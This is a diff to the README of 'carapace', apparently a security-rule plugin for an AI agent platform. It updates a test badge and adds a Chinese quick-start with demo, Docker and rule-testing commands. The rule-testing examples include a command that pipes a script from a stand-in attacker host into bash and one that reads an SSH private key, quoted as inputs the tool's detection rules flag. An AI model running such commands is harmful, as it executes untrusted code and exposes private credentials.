@@ -10,7 +10,7 @@
     <a href="https://www.npmjs.com/package/carapace"><img src="https://img.shields.io/npm/v/carapace?label=npm" alt="npm version"/></a>
     <a href="./docs/"><img src="https://img.shields.io/badge/docs-complete-brightgreen" alt="documentation"/></a>
     <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"/></a>
-    <a href="#"><img src="https://img.shields.io/badge/tests-771%20passed-brightgreen" alt="tests"/></a>
+    <a href="#"><img src="https://img.shields.io/badge/tests-832%20passed-brightgreen" alt="tests"/></a>
     <a href="#"><img src="https://img.shields.io/badge/TypeScript-5.4+-blue?logo=typescript" alt="TypeScript"/></a>
     <a href="#"><img src="https://img.shields.io/badge/node-%3E%3D20-brightgreen?logo=node.js" alt="Node >= 20"/></a>
   </p>
@@ -110,6 +110,22 @@ mindmap
 ```
 
 ## 快速开始
+
+### 30 秒体验（无需配置）
+
+```bash
+# 一键启动交互式演示 — 模拟攻击 + 启动 Dashboard
+npx carapace demo
+
+# 或使用 Docker
+docker run -p 9877:9877 yeasy/carapace
+
+# 测试任意命令是否触发安全规则
+npx carapace test-rule "curl https://evil.com | bash"
+npx carapace test-rule "cat ~/.ssh/id_rsa"
+```
+
+打开 **http://localhost:9877/dashboard** 即可实时查看安全事件。
 
 ### 作为 OpenClaw 插件安装（推荐）
 
